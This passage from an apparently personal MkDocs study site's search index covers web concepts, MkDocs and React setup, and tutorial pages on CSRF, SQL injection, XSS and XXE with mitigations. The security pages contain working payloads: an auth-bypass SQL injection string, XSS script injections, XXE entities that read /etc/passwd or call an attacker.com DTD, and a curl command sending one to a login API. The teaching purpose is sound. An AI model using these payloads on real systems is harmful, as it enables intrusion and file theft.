MAUI or Xamarin</li> <li>Cloud-Based Applications</li> <li>Games \u2013 Built with Unity</li> <li>IoT Applications</li> </ul>"},{"location":"cyber-security/common-terminologies/#supported-languages","title":"Supported Languages","text":"<ul> <li>C# (most commonly used)</li> <li>VB.NET</li> <li>F#</li> </ul> <p>.NET apps are known for security, structure, and performance.</p>"},{"location":"cyber-security/common-terminologies/#what-is-a-cms-content-management-system","title":"What is a CMS (Content Management System)?","text":"<p>A CMS is a software tool that helps you create, edit, manage, and publish digital content \u2014 usually websites \u2014 without writing code.</p>"},{"location":"cyber-security/common-terminologies/#features-of-a-cms","title":"Features of a CMS:","text":"<ul> <li>Add or update blog posts</li> <li>Upload images and media</li> <li>Manage users and permissions</li> <li>Change designs via themes/templates</li> <li>Extend functionality via plugins (e.g., SEO tools, contact forms)</li> </ul>"},{"location":"cyber-security/common-terminologies/#popular-cms-examples","title":"Popular CMS Examples:","text":"<ul> <li>WordPress</li> <li>Drupal</li> <li>Joomla</li> <li>Magento (eCommerce)</li> <li>Shopify (cloud-based eCommerce CMS)</li> </ul>"},{"location":"cyber-security/common-terminologies/#web-server-vs-application-server","title":"Web Server vs Application Server","text":"Feature Web Server Application Server Handles Static Content (HTML, CSS, JS, Images) Dynamic Content (Runs server-side code) Executes Code? \u274c No \u2705 Yes Use Case Serves files directly Runs business logic, APIs, database access Examples Apache, Nginx, IIS Tomcat, JBoss, ASP.NET Core"},{"location":"cyber-security/common-terminologies/#they-often-work-together","title":"They Often Work Together:","text":"<p>Example:</p> <ul> <li>Nginx (Web Server) \u2192 forwards dynamic requests to \u2192 Node.js (Application Server)</li> </ul>"},{"location":"cyber-security/common-terminologies/#why-use-nginx-in-front-of-nodejs","title":"Why Use Nginx in Front of Node.js?","text":"Reason Purpose Reverse Proxy Hides internal details, routes requests Load Balancing Distributes traffic to multiple Node.js instances SSL Termination Handles HTTPS encryption Static File Serving More efficient at serving static content Security Filters bad requests, rate limits Graceful Restarts Allows restarting Node.js without downtime"},{"location":"cyber-security/common-terminologies/#what-is-a-cdn","title":"What is a CDN?","text":"<p>A CDN (Content Delivery Network) is a network of servers around the globe that delivers content to users from the closest server, speeding up load times.</p>"},{"location":"cyber-security/common-terminologies/#how-it-works","title":"How It Works:","text":"<ul> <li>Without CDN \u2192 Content from US \u2192 Slow</li> <li>With CDN \u2192 Content from India-based server \u2192 Fast</li> </ul>"},{"location":"cyber-security/common-terminologies/#delivers","title":"Delivers:","text":"<ul> <li>Images</li> <li>Videos</li> <li>JS/CSS files</li> <li>Fonts</li> <li>Cached HTML pages</li> </ul>"},{"location":"cyber-security/common-terminologies/#benefits","title":"Benefits:","text":"<ul> <li>Faster load times</li> <li>Reduced server load</li> <li>DDoS protection</li> <li>Scalability &amp; availability</li> </ul>"},{"location":"cyber-security/common-terminologies/#popular-cdn-providers","title":"Popular CDN Providers:","text":"<ul> <li>Cloudflare</li> <li>Akamai</li> <li>Amazon CloudFront</li> <li>Google Cloud CDN</li> <li>Fastly</li> </ul>"},{"location":"cyber-security/common-terminologies/#relationship-between-browser-cdn-web-server-app-server","title":"Relationship Between Browser, CDN, Web Server &amp; App Server","text":"<pre><code>Browser\n    \u2193\nCDN \u2192 (serves static content if cached)\n    \u2193\nWeb Server \u2192 (serves static files or forwards)\n    \u2193\nApplication Server \u2192 (executes logic, fetches data)\n</code></pre>"},{"location":"cyber-security/common-terminologies/#web-1-vs-web-2-vs-web-3","title":"Web 1 vs Web 2 vs Web 3","text":"Web Generation Key Features Examples Web1 Static, read-only pages GeoCities, early Yahoo Web2 Interactive, user-generated content Facebook, YouTube, Instagram Web3 Decentralized, blockchain-based, user-owned data Crypto wallets, dApps, NFTs (OpenSea)"},{"location":"cyber-security/common-terminologies/#summary","title":"Summary:","text":"<ul> <li>Web1 = Read-only</li> <li>Web2 = Read + Write (social)</li> <li>Web3 = Decentralized + User ownership</li> </ul>"},{"location":"cyber-security/common-terminologies/#what-is-ajax","title":"What is AJAX?","text":"<p>AJAX (Asynchronous JavaScript and XML) allows web pages to update data without reloading the entire page.</p> <ul> <li>Sends background requests to the server.</li> <li>Updates only part of a page (like chat messages or form data).</li> <li>Used in modern web apps to make them faster and more interactive.</li> </ul>"},{"location":"cyber-security/common-terminologies/#what-is-xml","title":"What is XML?","text":"<p>XML (eXtensible Markup Language) is used for storing and transporting data in a structured, readable, and platform-independent format.</p>"},{"location":"cyber-security/common-terminologies/#key-features","title":"Key Features:","text":"<ul> <li>Self-descriptive</li> <li>Hierarchical (tree structure)</li> <li>Extensible (custom tags allowed)</li> <li>Human-readable</li> <li>Cross-platform</li> </ul>"},{"location":"cyber-security/common-terminologies/#example","title":"Example:","text":"<pre><code>&lt;book&gt;\n  &lt;title&gt;Learning XML&lt;/title&gt;\n  &lt;author&gt;John Doe&lt;/author&gt;\n  &lt;price&gt;29.99&lt;/price&gt;\n  &lt;availability&gt;In Stock&lt;/availability&gt;\n&lt;/book&gt;\n</code></pre>"},{"location":"cyber-security/common-terminologies/#xml-vs-json","title":"XML vs JSON","text":"Feature XML JSON Format Tag-based Key-value pairs Readability Verbose More concise Custom Tags Allowed Not applicable Attributes Supported Not supported (only key-values) Common Use Cases SOAP APIs, Configs, RSS REST APIs, Data exchange"},{"location":"cyber-security/common-terminologies/#json-version-of-xml-example","title":"JSON Version of XML Example:","text":"<pre><code>{\n  \"book\": {\n    \"title\": \"Learning XML\",\n    \"author\": \"John Doe\",\n    \"price\": \"29.99\",\n    \"availability\": \"In Stock\"\n  }\n}\n</code></pre>"},{"location":"cyber-security/common-terminologies/#notes","title":"Notes","text":"<ul> <li>Botnets: A network of hijacked internet-connected devices that are installed with   malicious codes known as malware.</li> <li>Virus and Worms: A Worm is a form of malware that replicates itself and can   spread to different computers via Network. A Virus is a malicious executable code</li> </ul>"},{"location":"cyber-security/cyber-attacks/csrf/","title":"Cross-Site Request Forgery (CSRF)","text":""},{"location":"cyber-security/cyber-attacks/csrf/#what-is-csrf","title":"What is CSRF?","text":"<p>Cross-Site Request Forgery (CSRF) is an attack where a hacker tricks a logged-in user\u2019s browser into making an unwanted request to a website without their knowledge.</p> <p>It exploits the trust that a website has in the user's browser, using the user's identity and session to perform actions they never intended \u2014 such as changing passwords, transferring money, or deleting accounts.</p>"},{"location":"cyber-security/cyber-attacks/csrf/#real-life-example","title":"Real-life Example","text":"<p>Imagine the following scenario:</p> <ol> <li>You are logged in to your bank's website (<code>yourbank.com</code>).</li> <li>Meanwhile, a hacker tricks you into clicking a malicious link or loading a page in the background.</li> <li>That page secretly sends a request like this:</li> </ol> <pre><code>POST yourbank.com/transfer?to=Hacker&amp;amount=10000\n</code></pre> <ul> <li>Your browser sends the request along with your cookies/session, and the bank processes it as if you initiated the action.</li> </ul> <p>Result: The hacker successfully transfers money from your account without your knowledge.</p>"},{"location":"cyber-security/cyber-attacks/csrf/#how-to-prevent-csrf","title":"How to Prevent CSRF","text":"<p>To mitigate CSRF attacks, websites can implement the following measures:</p> <ul> <li>CSRF Tokens: Include unique, unpredictable tokens in forms and verify them on the server.</li> <li>SameSite Cookies: Use the <code>SameSite</code> attribute in cookies to restrict cross-origin requests.</li> <li>User Authentication: Require re-authentication for sensitive actions.</li> <li>CORS Policies: Restrict cross-origin requests to trusted domains.</li> </ul>"},{"location":"cyber-security/cyber-attacks/csrf/#additional-details-on-prevention-techniques","title":"Additional Details on Prevention Techniques","text":""},{"location":"cyber-security/cyber-attacks/csrf/#1-csrf-tokens","title":"1. CSRF Tokens","text":"<p>Generate a random, secret token when the form loads. Add it as a hidden field in the form and validate it on the server when the form is submitted.</p> <p>Example:</p> <pre><code>&lt;form action=\"submit.php\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"csrf_token\" value=\"a1b2c3d4\" /&gt;\n&lt;/form&gt;\n</code></pre> <p>On the server, ensure the <code>csrf_token</code> is valid for the session before processing the request.</p>"},{"location":"cyber-security/cyber-attacks/csrf/#2-samesite-cookies","title":"2. SameSite Cookies","text":"<p>Use the <code>SameSite</code> attribute in cookies to prevent them from being sent with cross-site requests.</p> <p>Example:</p> <pre><code>Set-Cookie: sessionid=abc123; SameSite=Strict;\n</code></pre> <p>This ensures cookies are only sent with requests originating from the same site.</p>"},{"location":"cyber-security/cyber-attacks/csrf/#3-referer-header-validation","title":"3. Referer Header Validation","text":"<p>Validate the <code>Referer</code> header on the server to ensure the request originated from your domain. If the <code>Referer</code> is missing or from an untrusted source, block the request.</p> <p>By implementing these strategies, websites can significantly reduce the risk of CSRF attacks.</p>"},{"location":"cyber-security/cyber-attacks/sql-injection/","title":"SQL Injection","text":"<p>SQL injection is a type of cyber attack where the attacker manipulates SQL queries to gain unauthorized access to a database or retrieve sensitive information.</p>"},{"location":"cyber-security/cyber-attacks/sql-injection/#how-sql-injection-works","title":"How SQL Injection Works","text":"<p>When using a web application, SQL queries are typically pre-generated by the application, and the user only has control over the input fields. An attacker exploits this by providing specially crafted inputs to manipulate the SQL query.</p>"},{"location":"cyber-security/cyber-attacks/sql-injection/#key-concepts","title":"Key Concepts","text":"<ol> <li>User Input Control:    The attacker focuses on the user input fields to inject malicious SQL code.</li> <li>Manipulating SQL Queries:    By injecting specific inputs, the attacker can manipulate the SQL query to always return <code>TRUE</code>, bypassing authentication mechanisms.</li> </ol>"},{"location":"cyber-security/cyber-attacks/sql-injection/#example-of-sql-injection","title":"Example of SQL Injection","text":"<p>Consider a login form where the SQL query is:</p> <pre><code>SELECT * FROM users WHERE username = 'user' AND password = 'pass';\n</code></pre> <p>An attacker might input:</p> <ul> <li>Username: <code>admin' OR '1'='1</code></li> <li>Password: <code>anything</code></li> </ul> <p>The resulting query becomes:</p> <pre><code>SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything';\n</code></pre> <p>Since <code>1='1'</code> is always true, the query bypasses authentication, granting unauthorized access.</p>"},{"location":"cyber-security/cyber-attacks/sql-injection/#preventing-sql-injection","title":"Preventing SQL Injection","text":"<p>To mitigate SQL injection attacks:</p> <ul> <li>Use parameterized queries or prepared statements.</li> </ul> <p>Avoid directly concatenating user inputs into SQL queries. For example, instead of:</p> <pre><code>const query = `SELECT * FROM items WHERE owner = '${owner}' AND itemname = '${itemname}'`;\n</code></pre> <p>Use parameterized queries or prepared statements, such as:</p> <pre><code>client.query(\"SELECT * FROM items WHERE owner = $1 AND itemname = $2\", [\n  owner,\n  itemname,\n]);\n</code></pre> <ul> <li>Validate and sanitize user inputs.</li> <li>Employ web application firewalls (WAF).</li> <li>Regularly update and patch your database and application.</li> </ul>"},{"location":"cyber-security/cyber-attacks/sql-injection/#sql-injection-types","title":"SQL Injection Types","text":""},{"location":"cyber-security/cyber-attacks/sql-injection/#error-based-sql-injection","title":"Error Based SQL Injection","text":"<p>Attackers intentionally cause the database to throw errors by modifying the SQL query in a way that leads to a database exception. The goal is to gather valuable information from the error message, such as database structure, user information, or other sensitive data.</p> <ul> <li>UNION SQL Injection: The UNION operator is used to combine the results of the original query with the results from another SELECT query. Attackers can exploit this by adding a forged query to extract data from other tables.</li> </ul>"},{"location":"cyber-security/cyber-attacks/sql-injection/#blind-sql-injection","title":"Blind SQL Injection","text":"<p>Description: When error messages are not displayed or the attacker doesn't receive any feedback from the query, they must infer the result using boolean conditions or time delays. Blind SQLi can be categorized into:</p> <ul> <li> <p>Boolean-based Blind SQLi: Attackers use logical conditions (TRUE/FALSE) to determine if the query is returning true or false.</p> </li> <li> <p>Time-Based Blind SQLi: Attackers use time delays (WAITFOR DELAY) to infer whether a query is true based on the delay in the server's response.</p> </li> </ul>"},{"location":"cyber-security/cyber-attacks/sql-injection/#sql-injection-methodology","title":"SQL Injection Methodology","text":"<ul> <li>Information Gathering</li> <li>Launch SQL Injection Attacks</li> <li>Advanced SQL Injection</li> </ul> <p>SQL injection is a critical vulnerability that can lead to severe consequences if not addressed properly. Always follow secure coding practices to protect your applications.</p>"},{"location":"cyber-security/cyber-attacks/xss/","title":"XSS (Cross-Site Scripting)","text":"<p>XSS (Cross-Site Scripting) is a client-side attack where attackers inject malicious code, typically JavaScript, into a trusted website. This malicious code is then executed in the victim's browser, leading to various security risks.</p>"},{"location":"cyber-security/cyber-attacks/xss/#purpose-of-xss","title":"Purpose of XSS","text":"<ul> <li>Steal cookies or session IDs</li> <li>Hijack user accounts</li> <li>Modify web page content</li> <li>Redirect users to malicious websites</li> </ul>"},{"location":"cyber-security/cyber-attacks/xss/#types-of-xss","title":"Types of XSS","text":""},{"location":"cyber-security/cyber-attacks/xss/#reflected-xss-non-persistent-immediate-execution","title":"Reflected XSS (Non-persistent, Immediate Execution)","text":"<ul> <li>The malicious input (like a script) is not saved on the server.</li> <li>It is sent via a URL parameter or form input.</li> <li>The server immediately reflects this input back in the HTTP response (e.g., inside HTML, JS, or error messages).</li> <li>The script executes in the victim's browser once they click that URL or submit that form.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xss/#example","title":"Example","text":"<p>Consider the following URL:</p> <pre><code>http://vulnerable-site.com/search.php?q=&lt;script&gt;alert(\"XSS\")&lt;/script&gt;\n</code></pre> <p>If the server-side code is:</p> <pre><code>&lt;p&gt;Search result for: &lt;?php echo $_GET['q']; ?&gt;&lt;/p&gt;\n</code></pre> <p>The JavaScript <code>&lt;script&gt;alert(\"XSS\")&lt;/script&gt;</code> is rendered as part of the HTML, and it executes in the victim's browser. This happens because the input is not sanitized or escaped before being included in the response.</p> <p>Note :In many modern web apps use separate APIs, especially with React, Angular, etc. But in classic PHP (or any server-rendered site), the URL itself acts as the request to the server.</p>"},{"location":"cyber-security/cyber-attacks/xss/#stored-xss-persistent","title":"Stored XSS (Persistent)","text":"<ul> <li>The attacker submits a script to the server (e.g., in a form, comment box).</li> <li>The script gets stored in the database.</li> <li>Every time a user loads that page, the script runs automatically.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xss/#example_1","title":"Example","text":"<p>An attacker submits the following input in a comment box or name field:</p> <pre><code>&lt;script&gt;\n  alert(\"Stored XSS\");\n&lt;/script&gt;\n</code></pre>"},{"location":"cyber-security/cyber-attacks/xss/#behavior","title":"Behavior","text":"<ol> <li>The malicious script is stored in the database.</li> <li>When the page is loaded by any user, the script is injected into the page.</li> <li>The script executes in the browser of every visitor, causing widespread impact.</li> </ol>"},{"location":"cyber-security/cyber-attacks/xss/#key-points","title":"Key Points","text":"<ul> <li>Stored XSS is more dangerous than reflected XSS because it affects multiple users.</li> <li>Proper input validation and output encoding are essential to prevent this type of attack.</li> <li>Use Content Security Policy (CSP) to mitigate the impact of XSS vulnerabilities.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xss/#dom-based-xss-client-side-only","title":"DOM-based XSS (Client-Side Only)","text":"<ul> <li>No server involvement.</li> <li>JavaScript in the page reads from the URL, DOM, or cookies, and injects that into the page without sanitizing.</li> <li>The attacker manipulates the DOM directly.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xss/#example_2","title":"Example","text":"<p>Consider the following URL:</p> <pre><code>http://vulnerable-site.com/page.php#&lt;script&gt;alert('DOM XSS')&lt;/script&gt;\n</code></pre> <p>If the page contains the following JavaScript:</p> <pre><code>document.getElementById(\"msg\").innerHTML = window.location.hash;\n</code></pre> <p>When a user visits the URL:</p> <pre><code>http://vulnerable-site.com/page.php#&lt;script&gt;alert('DOM XSS')&lt;/script&gt;\n</code></pre> <p>The script <code>&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</code> is executed in the browser because the <code>window.location.hash</code> value is directly injected into the DOM without sanitization.</p>"},{"location":"cyber-security/cyber-attacks/xss/#mitigation-strategies","title":"Mitigation Strategies","text":"<ul> <li>Avoid directly injecting untrusted data into the DOM.</li> <li>Use libraries like DOMPurify to sanitize user input.</li> <li>Validate and encode data before rendering it in the DOM.</li> <li>Implement a strict Content Security Policy (CSP) to block inline scripts.</li> <li>Regularly review and test your code for XSS vulnerabilities.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xss/#notes","title":"Notes","text":"<ul> <li> <p>Sanitizing Input : Cleaning up user input to remove or neutralize anything dangerous before using it in your app. It\u2019s like filtering or validating the input the user gives to ensure it doesn\u2019t contain harmful stuff like:</p> </li> <li> <p>Escaping Output : When you're displaying user data on a page, convert any dangerous characters so the browser does NOT treat them as code.</p> </li> </ul>"},{"location":"cyber-security/cyber-attacks/xss/#common-sanitization-methods-php","title":"Common Sanitization Methods (PHP)","text":"Function What it does <code>strip_tags()</code> Removes all HTML tags <code>htmlspecialchars()</code> Converts HTML characters to safe text <code>preg_replace()</code> Replaces dangerous patterns Input validation Only allow expected formats (e.g., names, numbers)"},{"location":"cyber-security/cyber-attacks/xss/#preventions","title":"Preventions","text":"<ul> <li> <p>Filter input on arrival. At the point where user input is received, filter as strictly as possible   based on what is expected or valid input.</p> </li> <li> <p>Encode data on output. At the point where user-controllable data is output in HTTP   responses, encode the output to prevent it from being interpreted as active content. Depending   on the output context, this might require applying combinations of HTML, URL, JavaScript,   and CSS encoding.</p> </li> <li> <p>Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to   contain any HTML or JavaScript,</p> </li> <li> <p>Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP)   to reduce the severity of any XSS vulnerabilities that still occur.</p> </li> </ul>"},{"location":"cyber-security/cyber-attacks/xxe/","title":"XML External Entity (XXE)","text":"<p>An XML External Entity (XXE) attack is a security vulnerability that targets applications processing XML input. This attack leverages the behavior of XML parsers that support external entities, which are references to external or internal resources defined in the XML data.</p> <p>XXE attacks can be used to:</p> <ul> <li>Access sensitive files on the server (e.g., <code>/etc/passwd</code>).</li> <li>Perform server-side request forgery (SSRF) to interact with internal systems.</li> <li>Execute denial-of-service (DoS) attacks by causing resource exhaustion.</li> <li>Exfiltrate sensitive data or compromise the application's security.</li> </ul> <p>To mitigate XXE attacks, consider:</p> <ul> <li>Disabling external entity processing in XML parsers.</li> <li>Using secure libraries or parsers that do not support external entities by default.</li> <li>Validating and sanitizing XML input to prevent malicious payloads.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xxe/#how-it-works","title":"How It Works","text":"<p>XML has a feature that allows defining \"entities\" in a DOCTYPE. These can include external resources such as files or URLs. When an application parses an XML document and the parser is not securely configured, it may:</p> <ul> <li>Read files on the server.</li> <li>Make HTTP requests to internal systems (Server Side Request Forgery - SSRF).</li> <li>Leak sensitive data.</li> <li>Cause Denial of Service (e.g., via Billion Laughs attack).</li> </ul>"},{"location":"cyber-security/cyber-attacks/xxe/#xxe-payload-examples","title":"XXE Payload Examples","text":""},{"location":"cyber-security/cyber-attacks/xxe/#1-file-disclosure","title":"1. File Disclosure","text":"<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;root&gt;\n    &lt;data&gt;&amp;xxe;&lt;/data&gt;\n&lt;/root&gt;\n</code></pre>"},{"location":"cyber-security/cyber-attacks/xxe/#2-server-side-request-forgery-ssrf","title":"2. Server-Side Request Forgery (SSRF)","text":"<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY xxe SYSTEM \"http://localhost:8080/admin\"&gt;\n]&gt;\n&lt;root&gt;\n    &lt;data&gt;&amp;xxe;&lt;/data&gt;\n&lt;/root&gt;\n</code></pre>"},{"location":"cyber-security/cyber-attacks/xxe/#3-out-of-band-data-exfiltration","title":"3. Out-of-Band Data Exfiltration","text":"<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY % ext SYSTEM \"http://attacker.com/malicious.dtd\"&gt;\n    %ext;\n]&gt;\n</code></pre>"},{"location":"cyber-security/cyber-attacks/xxe/#exploiting-a-vulnerable-login-api","title":"Exploiting a Vulnerable Login API","text":""},{"location":"cyber-security/cyber-attacks/xxe/#example-scenario-login-via-xml","title":"Example Scenario: Login via XML","text":"<p>Some websites allow users to log in by sending XML data to an API. For example:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;login&gt;\n    &lt;username&gt;admin&lt;/username&gt;\n    &lt;password&gt;admin123&lt;/password&gt;\n&lt;/login&gt;\n</code></pre> <p>If the server uses an XML parser that is vulnerable to XXE, an attacker can exploit this to read sensitive files or perform other malicious actions.</p>"},{"location":"cyber-security/cyber-attacks/xxe/#step-by-step-xxe-attack-to-read-a-file","title":"Step-by-Step: XXE Attack to Read a File","text":"<p>To exploit the vulnerability and read a sensitive file (e.g., <code>/etc/passwd</code>), the attacker can modify the XML input as follows:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;login&gt;\n    &lt;username&gt;&amp;xxe;&lt;/username&gt;\n    &lt;password&gt;any&lt;/password&gt;\n&lt;/login&gt;\n</code></pre>"},{"location":"cyber-security/cyber-attacks/xxe/#explanation-of-the-attack","title":"Explanation of the Attack","text":"<ol> <li><code>&lt;!DOCTYPE foo [...]&gt;</code>: Declares a Document Type Definition (DTD).</li> <li><code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code>: Defines an external entity that points to the sensitive file.</li> <li><code>&amp;xxe;</code>: Replaces the entity with the contents of the file.</li> </ol> <p>If the server processes this XML and includes the entity, the response might look like this:</p> <pre><code>{\n  \"status\": \"error\",\n  \"username\": \"root:x:0:0:root:/root:/bin/bash\\nuser:x:1000:1000:user:/home/user:/bin/bash\"\n}\n</code></pre> <p>This response reveals the contents of <code>/etc/passwd</code>, demonstrating the severity of the vulnerability.</p>"},{"location":"cyber-security/cyber-attacks/xxe/#mitigation-tips","title":"Mitigation Tips","text":"<ul> <li>Disable DTD processing in the XML parser.</li> <li>Use a secure XML library that prevents XXE by default.</li> <li>Validate and sanitize all XML inputs.</li> <li>Implement strict input validation to reject malicious payloads.</li> <li>Use JSON or other safer formats for data exchange when possible.</li> <li>Monitor and log unusual activity to detect potential attacks.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xxe/#tools-and-techniques-used-by-attackers","title":"Tools and Techniques Used by Attackers","text":"<p>Hackers often bypass the normal website interface and use specialized tools to exploit vulnerabilities like XXE. Common tools include:</p> <ul> <li>Postman: Used to craft and send custom requests with full control over headers and body.</li> <li>cURL: A command-line tool to send raw XML payloads directly to the server.</li> <li>Burp Suite: A powerful tool to intercept, modify, and inject malicious payloads into requests.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xxe/#example-exploiting-xxe-with-curl","title":"Example: Exploiting XXE with cURL","text":"<p>Attackers can use <code>cURL</code> to send a malicious XML payload to a vulnerable server. For example:</p> <pre><code>curl -X POST https://vulnerable-site.com/api/login \\\n    -H \"Content-Type: application/xml\" \\\n    -d '&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n    &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;login&gt;\n    &lt;username&gt;&amp;xxe;&lt;/username&gt;\n    &lt;password&gt;test&lt;/password&gt;\n&lt;/login&gt;'\n</code></pre> <p>If the server is vulnerable, it might return the contents of <code>/etc/passwd</code> or any file accessible to the server.</p>"},{"location":"cyber-security/cyber-attacks/xxe/#classic-xxe-vs-blind-xxe","title":"Classic XXE vs. Blind XXE","text":"<ol> <li>Classic XXE: The server includes the data in the HTTP response, allowing the attacker to see it immediately.</li> <li>Blind XXE: The server sends the data to an external server controlled by the attacker (e.g., via DNS or HTTP). The attacker monitors their server logs to capture the stolen information.</li> </ol>"},{"location":"cyber-security/cyber-attacks/xxe/#mitigation-strategies","title":"Mitigation Strategies","text":"<ul> <li>Use tools like Burp Suite to test your application for XXE vulnerabilities.</li> <li>Regularly audit your XML parsers and configurations.</li> <li>Implement strict security measures as outlined in the mitigation tips above.</li> </ul>"},{"location":"cyber-security/cyber-attacks/xxe/#key-terms","title":"Key Terms","text":"Term Meaning XML Markup language for data storage/transfer. DTD Document Type Definition (defines XML structure). Entity Variable or placeholder in XML. SYSTEM Entity External reference (e.g., file or URL). SSRF Server-Side Request Forgery."},{"location":"mkdocs/information/mkdocs-info/","title":"MkDocs Setup Information","text":""},{"location":"mkdocs/information/mkdocs-info/#introduction","title":"Introduction","text":"<p>MkDocs is a static site generator that's geared towards project documentation. It is written in Python and is easy to configure and deploy.</p>"},{"location":"mkdocs/information/mkdocs-info/#installation","title":"Installation","text":"<p>To install MkDocs, use the following command:</p> <pre><code>pip install mkdocs\n</code></pre>"},{"location":"mkdocs/information/mkdocs-info/#creating-a-new-project","title":"Creating a New Project","text":"<p>To create a new MkDocs project, run:</p> <pre><code>mkdocs new my-project\ncd my-project\n</code></pre>"},{"location":"mkdocs/information/mkdocs-info/#running-the-project","title":"Running the Project","text":"<p>To start the live-reloading docs server, use:</p> <pre><code>mkdocs serve\n</code></pre> <p>You can then view the documentation at <code>http://127.0.0.1:8000/</code>.</p>"},{"location":"mkdocs/information/mkdocs-info/#building-the-documentation","title":"Building the Documentation","text":"<p>To build the documentation, run:</p> <pre><code>mkdocs build\n</code></pre> <p>This will create a <code>site</code> directory with your static site.</p>"},{"location":"mkdocs/information/mkdocs-info/#configuration","title":"Configuration","text":"<p>The configuration file <code>mkdocs.yml</code> is where you configure your MkDocs project. Here is an example configuration:</p> <pre><code># filepath: myDocs/my-project/mkdocs.yml\nsite_name: My Documentation Project\ntheme:\n  name: material\n  custom_dir: docs/overrides\n\n# above theme is added for customization of your docs (optional)\n\nnav:\n  - Home: index.md\n  - React:\n      - Snippets: react/snippets/example-snippet.md\n      - Information: react/information/example-info.md\n  - Bootstrap:\n      - Snippets: bootstrap/snippets/example-snippet.md\n      - Information: bootstrap/information/example-info.md\n  - Tailwind:\n      - Snippets: tailwind/snippets/example-snippet.md\n      - Information: tailwind/information/example-info.md\n  - Virtual Environment:\n      - Snippets: virtual-environment/snippets/create-virtual-env.md\n      - Information: virtual-environment/information/virtual-env-info.md\n  - MkDocs:\n      - Snippets: mkdocs/snippets/example-snippet.md\n      - Information: mkdocs/information/example-info.md\n\nplugins:\n  - search\n  - copy-button\n\nextra:\n  social:\n    - icon: fontawesome/brands/github\n      link: https://github.com/yourusername/yourrepo\n</code></pre>"},{"location":"mkdocs/information/mkdocs-info/#deployment","title":"Deployment","text":"<p>You can deploy your MkDocs site to GitHub Pages using:</p> <pre><code>mkdocs gh-deploy\n</code></pre> <p>For more detailed information, refer to the MkDocs documentation.</p>"},{"location":"mkdocs/snippets/mkdocs-snippet/","title":"MkDocs Setup Snippets","text":""},{"location":"mkdocs/snippets/mkdocs-snippet/#create-folder-structure","title":"Create Folder Structure","text":"<p>Create the following folder structure: (This is the sample structure where <code>docs</code> serve as the main directory and you have to include all the folders inside it. Add <code>mkdocs.yml</code> outside and <code>README.md</code>)</p> <pre><code>documentation-project\n\u251c\u2500\u2500 docs\n\u2502   \u251c\u2500\u2500 mkdocs\n\u2502   \u2502   \u251c\u2500\u2500 snippets\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 example-snippet.md\n\u2502   \u2502   \u2514\u2500\u2500 information\n\u2502   \u2502       \u2514\u2500\u2500 example-info.md\n\u2502   \u251c\u2500\u2500 react\n\u2502   \u2502   \u251c\u2500\u2500 snippets\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 example-snippet.md\n\u2502   \u2502   \u2514\u2500\u2500 information\n\u2502   \u2502       \u2514\u2500\u2500 example-info.md\n\u2502   \u251c\u2500\u2500 bootstrap\n\u2502   \u2502   \u251c\u2500\u2500 snippets\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 example-snippet.md\n\u2502   \u2502   \u2514\u2500\u2500 information\n\u2502   \u2502       \u2514\u2500\u2500 example-info.md\n\u2502   \u251c\u2500\u2500 tailwind\n\u2502   \u2502   \u251c\u2500\u2500 snippets\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 example-snippet.md\n\u2502   \u2502   \u2514\u2500\u2500 information\n\u2502   \u2502       \u2514\u2500\u2500 example-info.md\n\u2502   \u251c\u2500\u2500 virtual-environment\n\u2502   \u2502   \u251c\u2500\u2500 snippets\n\u2502   \u2502   \u2502   \u2514\u2500\u2500 create-virtual-env.md\n\u2502   \u2502   \u2514\u2500\u2500 information\n\u2502   \u2502       \u2514\u2500\u2500 virtual-env-info.md\n\u2502   \u2514\u2500\u2500 index.md\n\u251c\u2500\u2500 mkdocs.yml\n\u2514\u2500\u2500 README.md\n</code></pre>"},{"location":"react/information/example-info/","title":"Example Information about React","text":"<p>React is a JavaScript library for building user interfaces, primarily for single-page applications. It allows developers to create reusable UI components, manage the state of applications, and efficiently update the user interface when data changes.</p>"},{"location":"react/information/example-info/#key-concepts","title":"Key Concepts","text":"<ul> <li> <p>Components: The building blocks of a React application. Components can be functional or class-based and can manage their own state.</p> </li> <li> <p>JSX: A syntax extension that allows writing HTML-like code within JavaScript. JSX makes it easier to create and visualize the structure of the UI.</p> </li> <li> <p>State and Props: State is a built-in object that allows components to create and manage their own data. Props (short for properties) are used to pass data from one component to another.</p> </li> <li> <p>Lifecycle Methods: Special methods that allow you to run code at specific points in a component's life, such as when it mounts, updates, or unmounts.</p> </li> <li> <p>Hooks: Functions that let you use state and other React features in functional components. Common hooks include <code>useState</code>, <code>useEffect</code>, and <code>useContext</code>.</p> </li> </ul>"},{"location":"react/information/example-info/#getting-started","title":"Getting Started","text":"<p>To create a new React application, you can use Create React App, a command-line tool that sets up a new React project with a sensible default configuration.</p> <pre><code>npx create-react-app my-app\ncd my-app\nnpm start\n</code></pre> <p>This will create a new directory called <code>my-app</code> with all the necessary files and dependencies to start building your React 